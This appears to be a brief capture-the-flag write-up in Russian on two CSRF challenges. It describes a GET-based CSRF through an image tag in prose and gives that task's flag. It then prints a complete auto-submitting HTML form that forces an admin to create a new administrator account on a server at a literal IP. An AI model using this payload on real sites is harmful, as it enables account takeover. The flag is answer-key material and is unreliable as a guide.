1. GET CSRF
Использоватся payload, где в message board передаватась картинка с get запросом, который исполнялся на стороне админа
Flag: NOW_YOU_KNOW_GET_CSRF
2. POST CSRF
<form id="myForm" action="http://92.63.179.34/add_admin?username=1234567&password=1234567&isAdmin=yes&submit=Add+User" method="post"><input type="submit"></form> <script>var form = document.getElementById("myForm");  form.submit(); </script>

